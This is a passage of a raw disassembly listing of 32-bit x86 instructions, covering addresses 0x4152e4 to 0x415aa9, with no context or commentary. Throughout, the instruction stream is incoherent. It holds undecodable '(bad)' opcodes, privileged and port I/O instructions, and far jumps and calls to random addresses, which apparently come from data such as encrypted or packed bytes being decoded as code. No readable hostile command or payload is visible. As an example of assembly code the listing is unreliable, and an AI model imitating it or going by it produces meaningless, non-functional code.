  4152e4:	sub    DWORD PTR [edx],eax
  4152e6:	arpl   sp,bx
  4152e8:	xor    al,BYTE PTR [edx+0x32]
  4152eb:	nop
  4152ec:	jg     0x415273
  4152ee:	outs   dx,BYTE PTR ds:[esi]
  4152ef:	inc    ebp
  4152f0:	outs   dx,BYTE PTR ds:[esi]
  4152f1:	aaa    
  4152f2:	lods   al,BYTE PTR ds:[esi]
  4152f3:	inc    edi
  4152f4:	xchg   edx,eax
  4152f5:	mov    cl,0x21
  4152f7:	sar    BYTE PTR [ebx+0x5742c6c8],0x65
  4152fe:	adc    al,0x3b
  415300:	lods   eax,DWORD PTR ds:[esi]
  415301:	ficom  DWORD PTR [edi]
  415303:	fs cwde 
  415305:	fwait
  415306:	mov    ds:0x3879a0c3,eax
  41530b:	inc    esp
  41530c:	jno    0x4152ce
  41530e:	xchg   esp,eax
  41530f:	xlat   BYTE PTR ds:[ebx]
  415310:	ss scas ax,WORD PTR es:[edi]
  415313:	sahf   
  415314:	jmp    0x23be0b97
  415319:	and    DWORD PTR [esi-0x8fff91a],edi
  41531f:	and    eax,0x32ed254d
  415324:	mov    BYTE PTR [edi-0x4d],al
  415327:	and    eax,0x9e99ffc9
  41532c:	gs daa 
  41532e:	mov    ds:0x8161fa8a,eax
  415333:	push   0xfffffff9
  415335:	int3   
  415336:	pop    ebp
  415337:	ja     0x415345
  415339:	and    al,0xa
  41533b:	and    eax,0xf4fb4cac
  415340:	sub    dh,dl
  415342:	cmp    BYTE PTR [edx+0x340e3231],dh
  415348:	push   ebx
  415349:	mov    ah,0x62
  41534b:	add    dh,0xac
  41534e:	inc    ebx
  41534f:	jbe    0x4152d6
  415351:	push   ecx
  415352:	jmp    0x810ef640
  415357:	lahf   
  415358:	in     al,dx
  415359:	mov    bl,0x7
  41535b:	pop    esp
  41535c:	sti    
  41535d:	sbb    bh,bh
  41535f:	sbb    DWORD PTR [edx+esi*8-0x6b],esi
  415363:	mov    eax,0xae950e1e
  415368:	xchg   ebp,eax
  415369:	test   BYTE PTR [eax-0x54b7520b],ch
  41536f:	mov    dl,0xac
  415371:	and    al,0xf0
  415373:	push   cs
  415374:	test   eax,0xbbe8302c
  415379:	fimul  DWORD PTR [ebx]
  41537b:	bound  esi,QWORD PTR [esi+0xb]
  41537e:	icebp  
  41537f:	jecxz  0x4153d6
  415381:	aas    
  415382:	les    esi,FWORD PTR [eax+0x3e]
  415385:	fsubr  DWORD PTR [edi-0x2a]
  415388:	daa    
  415389:	xor    al,0xb8
  41538b:	lods   al,BYTE PTR ds:[esi]
  41538c:	or     DWORD PTR [edi],esp
  41538e:	push   esp
  41538f:	jne    0x415395
  415391:	pop    es
  415392:	ss dec esp
  415394:	pop    es
  415395:	add    DWORD PTR [edx-0x61],esi
  415398:	dec    DWORD PTR [ebp-0x46]
  41539b:	adc    al,0xee
  41539d:	cmp    eax,0xcddf0ae1
  4153a2:	popa   
  4153a3:	scas   eax,DWORD PTR es:[edi]
  4153a4:	pop    edi
  4153a5:	cmp    DWORD PTR [ebp+0x47],edi
  4153a8:	ret    0xa418
  4153ab:	mov    ah,0xc6
  4153ad:	push   esi
  4153ae:	lahf   
  4153af:	mov    ebp,0x42654605
  4153b4:	xchg   DWORD PTR [esi-0x59],edi
  4153b7:	push   cs
  4153b8:	xchg   edi,eax
  4153b9:	jecxz  0x4153d7
  4153bb:	mov    esi,0x6fd168eb
  4153c0:	sbb    cl,ch
  4153c2:	jg     0x4153d0
  4153c4:	jl     0x415434
  4153c6:	xchg   esp,eax
  4153c7:	lods   eax,DWORD PTR ds:[esi]
  4153c8:	cmp    eax,0x36e0005d
  4153cd:	mov    ecx,0xe928fbea
  4153d2:	xchg   DWORD PTR [ebp+0x3fb66188],esi
  4153d8:	sub    DWORD PTR [edx+esi*1+0x42],ebp
  4153dc:	xchg   ebx,eax
  4153dd:	sbb    eax,0xc561b079
  4153e2:	jg     0x41541a
  4153e4:	fsub   st(5),st
  4153e6:	movhps QWORD PTR [esi-0x7c],xmm6
  4153ea:	jp     0x4153a2
  4153ec:	mov    ah,0xae
  4153ee:	xchg   edi,eax
  4153ef:	in     eax,dx
  4153f0:	mov    ebx,0x8625199e
  4153f5:	es (bad) 
  4153f7:	cld    
  4153f8:	and    al,0xe5
  4153fa:	push   edi
  4153fb:	xchg   ebp,eax
  4153fc:	inc    ebp
  4153fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153fe:	dec    ecx
  4153ff:	mov    al,0xe5
  415401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415402:	add    ch,0xe9
  415405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415406:	jmp    0x820fc0fa
  41540b:	sar    BYTE PTR [ecx+0x2f],1
  41540e:	mov    BYTE PTR [ebx+0x74],bh
  415411:	push   cs
  415412:	aam    0x81
  415414:	imul   edx,esi,0xfffffff4
  415417:	dec    edi
  415418:	dec    edi
  415419:	nop
  41541a:	sar    esp,0x99
  41541d:	and    BYTE PTR [eax-0x13f81acf],ch
  415423:	ret    0x6655
  415426:	call   0xb496d819
  41542b:	dec    ebx
  41542c:	cmp    al,0x1e
  41542e:	xor    DWORD PTR [esi+0x50f1796b],0x4f
  415435:	loope  0x4153d6
  415437:	xchg   esp,eax
  415438:	retf   
  415439:	inc    ebp
  41543a:	adc    eax,0x7ad2b4b0
  41543f:	adc    DWORD PTR [esi],ecx
  415441:	pop    es
  415442:	cmp    BYTE PTR ds:0xb55068c3,ah
  415448:	pop    ebp
  415449:	jae    0x4154b5
  41544b:	lea    esp,[esi]
  41544d:	fstp   TBYTE PTR [edi+0x29]
  415450:	xlat   BYTE PTR ds:[ebx]
  415451:	pop    ebp
  415452:	fdivr  DWORD PTR ds:0x845dc4ac
  415458:	ins    DWORD PTR es:[edi],dx
  415459:	inc    ebp
  41545a:	int    0xe9
  41545c:	js     0x4153f0
  41545e:	sbb    ch,bl
  415460:	aaa    
  415461:	in     al,0x34
  415463:	cld    
  415464:	and    cl,dl
  415466:	cmp    bh,BYTE PTR [ebx-0x18]
  415469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41546a:	dec    esi
  41546b:	jp     0x4153f8
  41546d:	pop    esp
  41546e:	adc    DWORD PTR [ebx-0x3a],ebx
  415471:	sub    edx,DWORD PTR [ebx+0x79]
  415474:	test   ebp,0x279ddf42
  41547a:	aam    0x9d
  41547c:	bound  edx,QWORD PTR [ebx]
  41547e:	ret    
  41547f:	jl     0x4154a0
  415481:	shl    BYTE PTR [ecx-0x717cd6df],1
  415487:	fistp  WORD PTR [eax+ebx*4]
  41548a:	jmp    0x415475
  41548c:	repnz dec ecx
  41548e:	mov    esi,DWORD PTR ds:0x79ecf44
  415494:	pop    esi
  415495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415496:	clc    
  415497:	xchg   edi,eax
  415498:	in     al,dx
  415499:	in     al,0xb7
  41549b:	movsx  ebp,BYTE PTR [ecx+0x29]
  41549f:	shl    BYTE PTR [ebx+0x0],cl
  4154a2:	mov    ebp,0xd1f5f653
  4154a7:	int3   
  4154a8:	sbb    eax,0xd158e473
  4154ad:	inc    eax
  4154ae:	xor    BYTE PTR [edx],bl
  4154b0:	clc    
  4154b1:	sbb    edx,esp
  4154b3:	repz inc eax
  4154b5:	pop    ecx
  4154b6:	and    dl,ch
  4154b8:	push   0xffffff8f
  4154ba:	out    0x3d,eax
  4154bc:	(bad)  
  4154be:	inc    ebp
  4154bf:	or     bh,BYTE PTR [ecx+0x1848425]
  4154c5:	mov    bh,0x64
  4154c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154c8:	(bad)  
  4154c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ca:	int3   
  4154cb:	jo     0x415458
  4154cd:	sbb    ebx,DWORD PTR [ecx+0x58602a6c]
  4154d3:	cdq    
  4154d4:	pop    ds
  4154d5:	addr16 pusha 
  4154d7:	cld    
  4154d8:	icebp  
  4154d9:	sub    DWORD PTR [eax],esp
  4154db:	jns    0x4154c3
  4154dd:	mov    gs,WORD PTR [edi-0x3]
  4154e0:	ret    
  4154e1:	hlt    
  4154e2:	gs std 
  4154e4:	xchg   esp,eax
  4154e5:	mov    ebp,0xf399310a
  4154ea:	mov    eax,ds:0x8ce5e1f1
  4154ef:	pop    ss
  4154f0:	sub    edx,ebx
  4154f2:	pushw  es
  4154f4:	test   DWORD PTR [ebp-0x4066d2d5],0x94f4687a
  4154fe:	ret    0xb9bc
  415501:	push   0x53
  415503:	lds    edi,FWORD PTR [ebx]
  415505:	icebp  
  415506:	pop    ebp
  415507:	int3   
  415508:	fdiv   QWORD PTR [edi+0x7d1e4264]
  41550e:	and    BYTE PTR [ebx+ebx*4+0x65d5abc8],al
  415515:	push   ss
  415516:	jmp    0x1be7:0xa0031f94
  41551d:	dec    edx
  41551e:	outs   dx,DWORD PTR ds:[esi]
  41551f:	push   ds
  415520:	dec    edi
  415521:	lods   al,BYTE PTR ds:[esi]
  415522:	scas   al,BYTE PTR es:[edi]
  415523:	ins    BYTE PTR es:[edi],dx
  415524:	pop    ss
  415525:	xchg   DWORD PTR [esi+0x64],edi
  415528:	add    DWORD PTR [ebx-0x48],ebx
  41552b:	mov    esp,0xa7541c88
  415530:	mov    al,ds:0x5418b251
  415535:	pop    es
  415536:	(bad)  
  415537:	bound  ebp,QWORD PTR ss:[esi]
  41553a:	push   ds
  41553b:	sbb    ch,BYTE PTR [eax+0x4d]
  41553e:	jns    0x415500
  415540:	pop    ecx
  415541:	cmp    BYTE PTR [ebx+0x7b8313a7],dl
  415547:	xchg   BYTE PTR [ebp+0x42742a61],cl
  41554d:	xor    BYTE PTR [ecx+0x11eb30d4],dh
  415553:	es inc ebp
  415555:	hlt    
  415556:	int    0xf1
  415558:	lea    ebp,[ecx+esi*4-0x33]
  41555c:	and    ecx,DWORD PTR [edi+0x49d6866c]
  415562:	out    0x54,eax
  415564:	sub    al,0x56
  415566:	pop    edi
  415567:	cmp    dh,BYTE PTR [ebx-0x4ec0b90b]
  41556d:	dec    ebx
  41556e:	add    esi,esp
  415570:	or     eax,ebx
  415572:	mov    ds:0x7ffcfb6f,eax
  415577:	(bad)  
  415578:	cmp    DWORD PTR [edx+edi*8+0x154c4218],esp
  41557f:	xchg   BYTE PTR [ecx+0x995308c],bh
  415585:	inc    eax
  415586:	loope  0x4155c8
  415588:	jmp    0x41554a
  41558a:	bound  ebp,QWORD PTR [eax+0x58]
  41558d:	mov    ds:0xaf5af75f,al
  415592:	in     al,0x31
  415594:	xchg   ecx,eax
  415595:	fld    QWORD PTR [ebx+0x2b]
  415598:	cmp    DWORD PTR [eax+0xe94eb4a],0x44
  41559f:	(bad)  
  4155a0:	nop
  4155a1:	jae    0x4155bd
  4155a3:	jnp    0x41560f
  4155a5:	dec    eax
  4155a6:	cmp    eax,0xf4eeb72a
  4155ab:	shr    BYTE PTR [eax],0x8d
  4155ae:	fwait
  4155af:	cmp    eax,0x5378cd4e
  4155b4:	add    BYTE PTR [edx+0x72],ah
  4155b7:	fnstenv [eax+0x5ad3c554]
  4155bd:	pop    ebp
  4155be:	pop    edx
  4155bf:	mov    edx,0x7fe69319
  4155c4:	adc    bl,BYTE PTR [ebx+ebx*2]
  4155c7:	push   0x1d
  4155c9:	inc    edx
  4155ca:	inc    ecx
  4155cb:	imul   edx,DWORD PTR [ebx],0xa95e27d1
  4155d1:	cmc    
  4155d2:	rol    BYTE PTR [ecx+0x6a42af11],cl
  4155d8:	ins    DWORD PTR es:[edi],dx
  4155d9:	popf   
  4155da:	cwde   
  4155db:	loop   0x4155cd
  4155dd:	rcr    DWORD PTR [ebx-0x30],1
  4155e0:	call   0x52bd:0x8152093
  4155e7:	jp     0x41558b
  4155e9:	xchg   ebp,eax
  4155ea:	xor    al,0x2b
  4155ec:	cmp    eax,0xd09a1ba5
  4155f1:	loope  0x41562c
  4155f3:	cmc    
  4155f4:	rsqrtps xmm0,XMMWORD PTR [ecx+0x7d37011f]
  4155fb:	popa   
  4155fc:	add    DWORD PTR [ebp-0x7f4fb09f],esp
  415602:	ficomp DWORD PTR [edx]
  415604:	stc    
  415605:	sub    al,0xc1
  415607:	outs   dx,DWORD PTR ds:[esi]
  415608:	mov    ebp,0x2337ef80
  41560d:	shr    DWORD PTR [ecx],1
  41560f:	cmp    DWORD PTR [ebp+0x37],edi
  415612:	sbb    eax,0x853d67c4
  415617:	mov    al,al
  415619:	mov    dh,0xc3
  41561b:	xchg   ebp,eax
  41561c:	mov    ss,WORD PTR [edi-0x6a]
  41561f:	imul   DWORD PTR [eax+eiz*2+0x69]
  415623:	call   DWORD PTR [ebp-0x21]
  415626:	adc    DWORD PTR [eax+ecx*4-0x16643ff2],esp
  41562d:	and    BYTE PTR ds:0x14bd1d22,0x95
  415634:	(bad)  
  415635:	popa   
  415636:	push   0x5
  415638:	fdivr  QWORD PTR [ebx-0x53]
  41563b:	js     0x415668
  41563d:	push   edx
  41563e:	or     al,0x4c
  415640:	pop    ss
  415641:	dec    edx
  415642:	mov    esp,0x24ec4c33
  415647:	push   cs
  415648:	cs es mov ch,0xe1
  41564c:	fcmovnu st,st(7)
  41564e:	lods   al,BYTE PTR ds:[esi]
  41564f:	cmp    ebp,eax
  415651:	jbe    0x41567e
  415653:	push   ebp
  415654:	inc    eax
  415655:	sbb    eax,0x868dac44
  41565b:	stc    
  41565c:	inc    ecx
  41565d:	popf   
  41565e:	mov    esp,0x5885774a
  415663:	or     BYTE PTR [esi],ah
  415665:	dec    ebx
  415666:	or     eax,DWORD PTR [ebx-0x4f]
  415669:	ja     0x41563a
  41566b:	mov    DWORD PTR [ecx-0x65],eax
  41566e:	sbb    al,0x69
  415670:	jmp    0x47ef:0x110bfb6b
  415677:	gs jmp 0x415615
  41567a:	mov    eax,0x33401eda
  41567f:	outs   dx,BYTE PTR ds:[esi]
  415680:	pop    esp
  415681:	mov    ebp,DWORD PTR [ecx]
  415683:	inc    eax
  415684:	pop    ebp
  415685:	into   
  415686:	fs inc esp
  415688:	lea    edi,[eax-0x6b9aab38]
  41568e:	shl    eax,cl
  415690:	lea    edx,[eax+0x1977610]
  415696:	xor    BYTE PTR [ecx],0x56
  415699:	mov    WORD PTR [esi],ds
  41569b:	and    al,0xdb
  41569d:	in     eax,0xeb
  41569f:	mov    al,ds:0x3e5c765b
  4156a4:	addr16 mov ch,0x5a
  4156a7:	sub    DWORD PTR [edx-0x5a],edx
  4156aa:	mov    esp,0x5113986b
  4156af:	sbb    BYTE PTR [edi+0x642cc337],0xe5
  4156b6:	shr    edx,0xe4
  4156b9:	jmp    0x41569c
  4156bb:	or     BYTE PTR [ebx-0x1f974cb9],dh
  4156c1:	loop   0x415655
  4156c3:	ds pop edx
  4156c5:	test   al,0x2e
  4156c7:	xor    eax,0x6fd4be2a
  4156cc:	in     eax,0xab
  4156ce:	xchg   ebp,eax
  4156cf:	retf   
  4156d0:	push   ebp
  4156d1:	les    esp,FWORD PTR [ecx-0xb]
  4156d4:	jbe    0x4156e5
  4156d6:	inc    edx
  4156d7:	push   edx
  4156d8:	mov    bl,dl
  4156da:	jo     0x415702
  4156dc:	xchg   ecx,eax
  4156dd:	and    dh,ah
  4156df:	mov    DWORD PTR [edx],esi
  4156e1:	ds push ecx
  4156e3:	lahf   
  4156e4:	cld    
  4156e5:	mov    dl,0x70
  4156e7:	ss xchg esp,eax
  4156e9:	xor    DWORD PTR [edi-0x15],0x45
  4156ed:	jmp    DWORD PTR [esi+0x7f]
  4156f0:	repnz adc DWORD PTR [ebx-0x71],ecx
  4156f4:	cdq    
  4156f5:	mulps  xmm7,XMMWORD PTR [esi+0x15]
  4156f9:	shr    DWORD PTR [esi+0x7e4b3135],0x3c
  415700:	sub    ebx,DWORD PTR [esi+0x6c]
  415703:	sbb    eax,0x6875822f
  415708:	cld    
  415709:	dec    esp
  41570a:	call   FWORD PTR [ebx-0x78]
  41570d:	test   BYTE PTR [ecx],dl
  41570f:	xchg   ecx,eax
  415710:	icebp  
  415711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415712:	pop    es
  415713:	imul   edi,DWORD PTR [edi+0x5d2ff5ae],0xffffffab
  41571a:	clc    
  41571b:	sub    eax,0xf6b7fb39
  415720:	push   ss
  415721:	mov    ebx,0x290ed841
  415726:	and    al,BYTE PTR [ebx-0x11]
  415729:	sti    
  41572a:	in     eax,0xa1
  41572c:	mov    eax,0x5c691913
  415731:	sub    al,0x8
  415733:	test   eax,0xc2251558
  415738:	sbb    esp,edx
  41573a:	adc    DWORD PTR [edi+0x5f66a758],edi
  415740:	cmc    
  415741:	and    bl,BYTE PTR [esp+eax*2-0x4057fdf7]
  415748:	fistp  DWORD PTR [edi-0x70e3fa9]
  41574e:	inc    ebx
  41574f:	cmp    BYTE PTR [esi-0x100e2d42],cl
  415755:	jnp    0x415773
  415757:	sbb    al,0xf2
  415759:	push   cs
  41575a:	xchg   edx,eax
  41575b:	into   
  41575c:	inc    ecx
  41575d:	sbb    al,0x7a
  41575f:	inc    DWORD PTR [edx]
  415761:	inc    esp
  415762:	out    0xde,al
  415764:	les    edi,FWORD PTR [edi]
  415766:	int    0x8a
  415768:	dec    edi
  415769:	mov    bl,0x9f
  41576b:	fcmovnbe st,st(4)
  41576d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576e:	xchg   esp,eax
  41576f:	mov    eax,ds:0xb6780e2f
  415774:	jge    0x415760
  415776:	repnz mov al,0x83
  415779:	add    eax,0xb456cf3e
  41577e:	popa   
  41577f:	mov    ds:0xb2bed61d,eax
  415784:	jbe    0x41576f
  415786:	arpl   WORD PTR [ecx+0xa],sp
  415789:	dec    ebp
  41578a:	out    0x2f,eax
  41578c:	(bad)  
  41578d:	jl     0x41572e
  41578f:	cs fwait
  415791:	leave  
  415792:	sar    BYTE PTR [ebx+0x161bb95f],cl
  415798:	dec    eax
  415799:	sbb    esi,DWORD PTR [edi+0x2631ea70]
  41579f:	int    0xd6
  4157a1:	or     bh,BYTE PTR [ebx]
  4157a3:	jecxz  0x4157c6
  4157a5:	and    DWORD PTR [ebp+0x6a],0x7d
  4157a9:	pop    ecx
  4157aa:	sbb    eax,0xb06034b9
  4157af:	push   ecx
  4157b0:	jmp    0x4157c8
  4157b2:	and    ecx,DWORD PTR [edi]
  4157b4:	push   cs
  4157b5:	test   eax,0x4f0acbf1
  4157ba:	call   0x277d:0x36e7b54f
  4157c1:	cmp    eax,0xb3275c3a
  4157c6:	hlt    
  4157c7:	out    dx,eax
  4157c8:	dec    edi
  4157c9:	jge    0x41577b
  4157cb:	xchg   ebp,eax
  4157cc:	addr16 mov ch,0x46
  4157cf:	imul   edx,DWORD PTR [esi+0x24f685d9],0x92d4cdf0
  4157d9:	in     eax,dx
  4157da:	fcom   DWORD PTR [eax+eax*4+0x21d9772d]
  4157e1:	mov    ah,0xf2
  4157e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e4:	out    0x7c,al
  4157e6:	push   0xffffff82
  4157e8:	mov    esp,0x603ee9fe
  4157ed:	fdivr  DWORD PTR ds:0xe44725eb
  4157f3:	or     eax,0x49bdfda4
  4157f8:	lods   al,BYTE PTR ds:[esi]
  4157f9:	mov    edx,0x405690ee
  4157fe:	sub    BYTE PTR ss:[ebp-0x2bd55fdd],bh
  415805:	sar    cl,cl
  415807:	push   esp
  415808:	push   0xffffffbd
  41580a:	ins    DWORD PTR es:[edi],dx
  41580b:	mov    DWORD PTR ds:0x585ae82,edi
  415811:	jae    0x415877
  415813:	mov    ebp,0x80e85ccb
  415818:	addr16 nop
  41581a:	fsubr  DWORD PTR [edi+0x5c]
  41581d:	adc    ch,BYTE PTR [edi+0x71]
  415820:	xchg   ebx,eax
  415821:	stos   DWORD PTR es:[edi],eax
  415822:	jmp    0xf41161fb
  415827:	in     eax,dx
  415828:	ret    
  415829:	sbb    eax,0xd0f71785
  41582e:	mov    dl,0x78
  415830:	xor    bl,BYTE PTR [edx+eiz*8-0x1f]
  415834:	(bad)  
  415835:	out    dx,al
  415836:	push   ebp
  415837:	les    esi,FWORD PTR [ebx]
  415839:	push   0xffffffe7
  41583b:	jge    0x4157f3
  41583d:	popf   
  41583e:	ret    0xde6f
  415841:	dec    ebx
  415842:	into   
  415843:	xchg   DWORD PTR [edx+0x24],eax
  415846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415847:	jl     0x4157ea
  415849:	retf   
  41584a:	icebp  
  41584b:	mov    ah,0xa9
  41584d:	std    
  41584e:	mov    WORD PTR [edi-0x44],es
  415851:	mov    ah,0xaa
  415853:	pop    ds
  415854:	fdivr  DWORD PTR [ebx+0x234e55c]
  41585a:	or     eax,0x978ab112
  41585f:	cmp    BYTE PTR [edx],bl
  415861:	icebp  
  415862:	push   eax
  415863:	fwait
  415864:	lds    ebx,FWORD PTR [edx+0x29]
  415867:	test   DWORD PTR [edx+0x8ebadb4],esp
  41586d:	xchg   ebx,eax
  41586e:	rcr    dl,0xa0
  415871:	dec    edi
  415872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415873:	fidivr WORD PTR [edx-0x7ddb6c66]
  415879:	mov    ds:0x6ee638a9,eax
  41587e:	dec    ebx
  41587f:	mov    eax,0x1eab115
  415884:	or     eax,0x4f7494a9
  415889:	adc    BYTE PTR [ebp+0x1aa753ea],bl
  41588f:	jmp    0x490fe0ab
  415894:	in     al,dx
  415895:	xchg   esi,eax
  415896:	mov    esi,0xbd0b8f1a
  41589b:	lods   eax,DWORD PTR ds:[esi]
  41589c:	or     ebp,ecx
  41589e:	cli    
  41589f:	hlt    
  4158a0:	mov    eax,ds:0xb757273f
  4158a5:	and    al,0xe2
  4158a7:	rcl    DWORD PTR [eax-0x9],1
  4158aa:	mov    bl,0xd7
  4158ac:	adc    eax,0xd2dd13e0
  4158b1:	fcmovnu st,st(1)
  4158b3:	jae    0x415919
  4158b5:	mov    eax,0xffe39535
  4158ba:	out    0x9,eax
  4158bc:	fstp   QWORD PTR [ecx]
  4158be:	iret   
  4158bf:	scas   eax,DWORD PTR es:[edi]
  4158c0:	int3   
  4158c1:	dec    eax
  4158c2:	xor    DWORD PTR [edi],eax
  4158c4:	push   es
  4158c5:	or     DWORD PTR [ecx],edi
  4158c7:	aam    0x84
  4158c9:	jmp    0x4158bf
  4158cb:	and    BYTE PTR [eax],dh
  4158cd:	ins    DWORD PTR es:[edi],dx
  4158ce:	xor    DWORD PTR fs:[ecx+0x70736f77],edx
  4158d5:	(bad)  [esi]
  4158d7:	lods   al,BYTE PTR ds:[esi]
  4158d8:	mov    ah,0x88
  4158da:	push   ebp
  4158db:	or     al,ch
  4158dd:	lds    ax,DWORD PTR [ecx-0x54]
  4158e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e2:	sub    cl,BYTE PTR [edi+0x57]
  4158e5:	pop    edx
  4158e6:	call   0x5f91bf3e
  4158eb:	sahf   
  4158ec:	inc    ebp
  4158ed:	jb     0x41591c
  4158ef:	and    BYTE PTR [edx],ah
  4158f1:	fsubr  QWORD PTR [eax+0x56]
  4158f4:	lahf   
  4158f5:	(bad)  
  4158f6:	pusha  
  4158f7:	push   es
  4158f8:	arpl   WORD PTR [eax],si
  4158fa:	xchg   esi,eax
  4158fb:	jle    0x4158d2
  4158fd:	jnp    0x4158cb
  4158ff:	(bad)  
  415901:	sub    BYTE PTR [edx],ch
  415903:	shr    BYTE PTR [ebp-0x12],cl
  415906:	cwde   
  415907:	fisubr DWORD PTR [ecx]
  415909:	bound  edi,QWORD PTR [esi]
  41590b:	sbb    al,0x58
  41590d:	popa   
  41590e:	xchg   esi,eax
  41590f:	ins    BYTE PTR es:[edi],dx
  415910:	push   esp
  415911:	dec    esp
  415912:	push   cs
  415913:	scas   eax,DWORD PTR es:[edi]
  415914:	cmp    esp,DWORD PTR [eax+0x78]
  415917:	push   es
  415918:	sub    BYTE PTR [edi-0x60bc7cc6],0xac
  41591f:	call   0x23f3:0xa7992e50
  415926:	(bad)  
  415927:	mov    ebp,0x3c6f1a6
  41592c:	push   0xfffffff6
  41592e:	call   0xd3f562e0
  415933:	push   ecx
  415934:	call   0xd0a7bf13
  415939:	retf   0x4634
  41593c:	inc    esi
  41593d:	cs ins BYTE PTR es:[edi],dx
  41593f:	jmp    0x5cf9:0x838dbd62
  415946:	imul   esp,ebx,0x96fd8ad7
  41594c:	lock and edi,edx
  41594f:	mov    al,0x3d
  415951:	fld    QWORD PTR [eax-0x3ef6a4dc]
  415957:	ss jp  0x4159c5
  41595a:	arpl   cx,di
  41595c:	in     eax,0x1c
  41595e:	xchg   ecx,eax
  41595f:	arpl   WORD PTR [ebp-0x14],bx
  415962:	jb     0x415996
  415964:	mov    edx,DWORD PTR [ebx]
  415966:	xor    DWORD PTR [edi+0x5c],eax
  415969:	js     0x4159a5
  41596b:	(bad)  
  41596c:	shl    BYTE PTR [ecx],cl
  41596e:	shl    BYTE PTR [ecx-0x2d],1
  415971:	adc    DWORD PTR [edi+0x2107a28e],eax
  415977:	jle    0x4159e2
  415979:	pusha  
  41597a:	call   0xa5a0cd01
  41597f:	ins    DWORD PTR es:[edi],dx
  415980:	or     eax,DWORD PTR [edx]
  415982:	mov    ch,0x48
  415984:	popf   
  415985:	sub    eax,0x674ddf4a
  41598a:	mov    edi,0xbc521915
  41598f:	sar    eax,cl
  415991:	pop    ebp
  415992:	mov    esp,0x6d63e478
  415997:	dec    edx
  415998:	ins    BYTE PTR es:[edi],dx
  415999:	inc    edi
  41599a:	gs call 0x6222:0xf27918af
  4159a2:	loope  0x4159e2
  4159a4:	cmp    eax,0xb7e8727d
  4159a9:	popa   
  4159aa:	js     0x4159b9
  4159ac:	jge    0x415968
  4159ae:	jecxz  0x41598f
  4159b0:	data16 outs dx,BYTE PTR ds:[esi]
  4159b2:	mov    eax,0x4d0a60
  4159b7:	(bad)  
  4159b8:	je     0x415a37
  4159ba:	adc    ecx,esi
  4159bc:	mov    bh,0x8f
  4159be:	test   DWORD PTR [eax-0x669dcae9],ebx
  4159c4:	push   edx
  4159c5:	mov    dl,0x3d
  4159c7:	popf   
  4159c8:	cs pushf 
  4159ca:	imul   ebp,edi,0xbafc38e
  4159d0:	pop    edi
  4159d1:	jl     0x415a25
  4159d3:	mov    dl,0xbd
  4159d5:	add    eax,0x747438b0
  4159da:	dec    ebp
  4159db:	test   BYTE PTR [ecx],0xe
  4159de:	or     al,0x82
  4159e0:	adc    eax,0xe826fe9a
  4159e5:	scas   al,BYTE PTR es:[edi]
  4159e6:	loope  0x4159fd
  4159e8:	inc    eax
  4159e9:	dec    ecx
  4159ea:	fs jns 0x415a4e
  4159ed:	loope  0x415a3d
  4159ef:	pop    esi
  4159f0:	push   esi
  4159f1:	mov    ebx,0x5211af12
  4159f6:	xchg   esi,eax
  4159f7:	mov    ecx,esp
  4159f9:	jecxz  0x415a10
  4159fb:	js     0x415a10
  4159fd:	cmp    dh,BYTE PTR [edx+0x29]
  415a00:	mov    al,ds:0xda75036b
  415a05:	dec    edx
  415a06:	mov    edx,0x1c92816c
  415a0b:	fadd   QWORD PTR [ebp-0x27d23264]
  415a11:	sub    ebp,DWORD PTR [ecx]
  415a13:	call   0xfa893d36
  415a18:	push   eax
  415a19:	popf   
  415a1a:	mov    eax,0x9c5e2f2d
  415a1f:	aad    0x2a
  415a21:	add    eax,0x935fedb5
  415a26:	sbb    al,0x9d
  415a28:	cmp    dh,BYTE PTR [eax]
  415a2a:	jo     0x415a88
  415a2c:	das    
  415a2d:	xchg   ebp,eax
  415a2e:	retf   0x479e
  415a31:	mov    ch,0xe
  415a33:	repz xor BYTE PTR [ecx],bl
  415a36:	fsub   QWORD PTR [eax+0x68]
  415a39:	xchg   edi,eax
  415a3a:	loopne 0x415a97
  415a3c:	cmpxchg ah,ch
  415a3f:	jnp    0x415a88
  415a41:	jo     0x415a91
  415a43:	sbb    ebp,ebp
  415a45:	into   
  415a46:	xor    al,0x23
  415a48:	pushf  
  415a49:	pushf  
  415a4a:	retf   0x4866
  415a4d:	pushf  
  415a4e:	dec    ecx
  415a4f:	jge    0x415a13
  415a51:	popa   
  415a52:	xchg   BYTE PTR [edx-0x7bd9beea],ah
  415a58:	cmp    al,0xce
  415a5a:	lgdtd  ds:0x7bf38ab
  415a61:	into   
  415a62:	(bad)
  415a65:	xchg   ecx,eax
  415a66:	adc    esi,ecx
  415a68:	leave  
  415a69:	xor    ch,dh
  415a6b:	push   esi
  415a6c:	mov    edx,0xc4e3acfd
  415a71:	xor    edi,DWORD PTR [eax]
  415a73:	sub    BYTE PTR [edx+edx*8+0x69],dh
  415a77:	xlat   BYTE PTR ds:[ebx]
  415a78:	push   ebx
  415a79:	cmc    
  415a7a:	aas    
  415a7b:	retf   0xe652
  415a7e:	ins    DWORD PTR es:[edi],dx
  415a7f:	mov    bl,0x17
  415a81:	sahf   
  415a82:	dec    ebp
  415a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a84:	sbb    dl,bl
  415a86:	dec    ebx
  415a87:	in     al,dx
  415a88:	mov    al,ds:0x32ad2d2e
  415a8d:	aaa    
  415a8e:	adc    ebp,DWORD PTR [ebx-0x3b14f7ef]
  415a94:	jmp    0x415a5e
  415a96:	ins    DWORD PTR es:[edi],dx
  415a97:	jmp    0x2fbd0501
  415a9c:	jle    0x415ad5
  415a9e:	lods   al,BYTE PTR ds:[esi]
  415a9f:	or     DWORD PTR [edi+0x74cbe22f],ebx
  415aa5:	scas   al,BYTE PTR es:[edi]
  415aa6:	int    0x9b
  415aa8:	dec    ecx
  415aa9:	add    eax,0x6c37f3d1
